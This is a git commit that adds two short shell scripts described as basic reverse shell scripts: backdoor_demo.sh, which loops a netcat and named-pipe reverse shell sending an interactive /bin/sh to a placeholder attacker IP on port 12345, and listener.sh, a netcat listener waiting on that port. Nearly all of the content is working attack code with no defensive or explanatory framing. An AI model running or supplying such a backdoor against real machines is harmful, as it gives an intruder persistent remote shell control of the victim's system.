4634663ade31729ae6ee2d88fadba378c1ae4c5f
peraLimonera <66177825+peraLimonera@users.noreply.github.com>
2020-06-01 00:47:04 +0100

    uploading basic reverse shell scripts

---
+++ backdoor_demo.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+
+while [ 1 ]; do
+	rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc  /put_the_atacker_ip_here 12345 > /tmp/f 
+done
---
+++ listener.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+while [ 1 ]; do
+	nc -vvvl 12345
+done
